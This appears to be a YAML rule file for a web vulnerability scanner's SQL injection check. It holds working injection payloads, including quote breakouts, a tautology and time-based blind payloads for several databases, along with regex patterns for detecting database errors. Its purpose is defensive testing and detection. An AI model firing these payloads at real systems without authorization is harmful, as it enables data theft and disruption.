id: sqli-injection
name: SQL Injection
family: sqli
severity: high
cwe: CWE-89
owasp: WSTG-INPV-05
cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
inject_into: [query, body, json, path]
payloads:
  - "'"
  - "1' OR '1'='1"
# Tried only when the planner marks sqli a priority for the target (e.g. a PHP stack). More ways to
# break out of the surrounding SQL literal/clause, so a backend that quotes/parenthesises differently
# still throws a parse error — which the SAME error-based oracle below confirms (never a bare reflection).
intensive_payloads:
  - "\""                       # double-quote string context
  - "')"                       # close a single-quoted, parenthesised argument
  - "\")"                      # close a double-quoted, parenthesised argument
  - "';"                       # stacked-query terminator
  - "1')) OR (('1'='1"         # doubly-parenthesised context
  - "\\"                       # trailing backslash escapes the quote the app appends -> dangling literal
  - "1`"                       # backtick identifier breakout (MySQL)
oracle:
  type: any_of
  checks:
    - type: response_match
      part: body
      patterns:
        - "SQL syntax"
        - "SQLite3::error"
        - "sqlite3\\.OperationalError"
        - "ORA-\\d{5}"
        - "mysql_fetch"
        - "PostgreSQL.{0,20}ERROR"
        - "unrecognized token"
        # ORM / HQL injection (Hibernate, NHibernate, JPA/JPQL). These are exception *class names*
        # from the object-query layer — they only appear in a real server-side parse error when our
        # payload broke the HQL/JPQL query, never as a benign reflection of the input.
        - "org\\.hibernate\\.(?:QueryException|hql|exception\\.SQLGrammarException|QueryParameterException)"
        - "QuerySyntaxException"
        - "NHibernate\\.(?:Hql|QueryException|Exceptions)"
        - "(?:javax|jakarta)\\.persistence\\.\\w*(?:Exception|Query)"
    # Time-based blind: the error-suppressed case (no DB error, no boolean signal). Each check is confirmed
    # by the SAME proportional-delay oracle (0 / D / 2D must scale), so adding cross-database and cross-context
    # payloads only widens coverage — a non-injectable point never scales, so it can never false-positive.
    # MySQL / MariaDB — parenthesised-numeric and string contexts:
    - type: time_based
      payload: "1) OR SLEEP({{delay}})-- -"
      delay: 3
      threshold_ms: 2500
    - type: time_based
      payload: "' AND SLEEP({{delay}})-- -"
      delay: 3
      threshold_ms: 2500
    # PostgreSQL — pg_sleep in a string-breakout context:
    - type: time_based
      payload: "' AND {{delay}}=(SELECT {{delay}} FROM PG_SLEEP({{delay}}))-- -"
      delay: 3
      threshold_ms: 2500
    # Microsoft SQL Server — WAITFOR DELAY (stacked after a string breakout):
    - type: time_based
      payload: "'; WAITFOR DELAY '0:0:{{delay}}'-- -"
      delay: 3
      threshold_ms: 2500
    # Oracle — DBMS_PIPE.RECEIVE_MESSAGE blocks for the timeout when no message arrives:
    - type: time_based
      payload: "' AND {{delay}}=DBMS_PIPE.RECEIVE_MESSAGE('a',{{delay}})-- -"
      delay: 3
      threshold_ms: 2500
confirm_reproducible: true
remediation: >-
  Use parameterized queries / prepared statements for every database call.
  Never build SQL by interpolating user input into a query string.
